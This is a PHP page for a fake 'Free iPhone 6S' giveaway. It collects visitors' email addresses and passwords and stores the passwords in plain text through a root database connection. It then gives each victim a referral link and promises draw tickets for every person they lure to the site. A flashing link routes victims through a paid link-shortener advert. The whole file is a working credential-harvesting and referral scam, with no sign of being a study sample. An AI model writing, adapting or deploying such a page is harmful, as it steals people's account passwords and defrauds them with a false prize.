<?php

if(!isset($_POST['email']) || empty($_POST['email']) || !isset($_POST['pass']) || empty($_POST['pass']))
{
	die('Oops! Something went Wrong. Please try again, <br><a href="index.php">Click here to go to Homepage</a>');
}

function generateRandomString($length = 7)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= str_shuffle($characters[rand(0, $charactersLength - 1)]);
    }
    return $randomString;
}

$email=($_POST['email']);
$pass=($_POST['pass']);

$con=mysqli_connect('localhost', 'root', '');
mysqli_select_db($con, 'database');

$email=mysqli_real_escape_string($con, $_POST['email']);
$pass=mysqli_real_escape_string($con, $_POST['pass']);

$query="SELECT `refe` FROM `table_name` WHERE `ad`='$email'";
$results=mysqli_query($con, $query);

if(mysqli_num_rows($results)!=0)
{
	$row=mysqli_fetch_assoc($results);
	$refer=$row['refe'];
}
else
{
	$random=generateRandomString();
	$query="INSERT INTO `table_name` VALUES('', '$email', '$pass', '$random')";
	@mysqli_query($con, $query);
	$refer=$random;
}


?>

<!DOCTYPE html>
<html>
<head>
	<title>Free Iphone 6S for everyone</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="style.css">
	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
</head>
<body>

<div class="top">
	<h1 style="margin-top:0;">Free iPhone 6S for everyone</h1>
</div>
	<header>
		<img src="logo.png">
		<div class="head" style="display:inline-block;align-self:center">
			<h3>Guidelines</h3>
			1. The number of visitors to our website from your referral link will reach, those many tickets we will add to lucky draw of your email id.<br><br>
			2. From every 500 tickets, we draw one random ticket, and select our lucky winner for iPhone 6S and inform on your email.
		</div>

	</header>

	<div class="intro" style="padding: 20px">
		
		Your referral link is <br><span style="color:#4267B2"> http://www.free-i-phone.16mb.com?refer=<?php echo $refer; ?></span><br>
		<br>
		As many people will come to our website from your link, we will put that many tickets in the draw for you.

	</div>

	<div class="advertisement" style="border-top: solid 1px black;margin-top: 30px;color: #CCCCCC">
		Advertisement
		<div id="cli">
			<h3><a href='http://sh.st/st/7933b65bb88c915480a020e12e11b7f4/free-i-phone.16mb.com/referagain.html' id="clickad">Click here to make more tickets on this website</a></h3>
		</div>
	</div>

	<script type="text/javascript">
		
		var heading=document.getElementById('clickad');

		function makered()
		{
			heading.style.color='red';
			setTimeout('makegreen()', 200);
		}

		function makegreen()
		{
			heading.style.color='green';
			setTimeout('makered()', 200);
		}

		makered();

	</script>

</body>
</html>